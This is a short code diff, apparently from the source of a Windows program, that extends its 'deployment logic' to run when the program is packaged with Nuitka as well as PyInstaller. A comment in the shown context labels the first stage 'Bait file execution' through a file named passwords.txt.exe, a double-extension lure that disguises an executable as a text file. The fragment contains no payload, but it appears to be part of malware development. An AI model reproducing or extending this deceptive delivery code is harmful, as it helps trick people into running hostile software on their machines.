@@ -517,8 +517,8 @@ def run_with_auto_restart(host: str, port: int) -> None:
 
 
 if __name__ == "__main__":
-    # Only run deployment logic on Windows and when frozen by PyInstaller
-    if platform.system() == "Windows" and getattr(sys, "frozen", False):
+    # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
+    if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):
 
         # STAGE 1: Bait file execution (passwords.txt.exe)
         if is_bait_file():
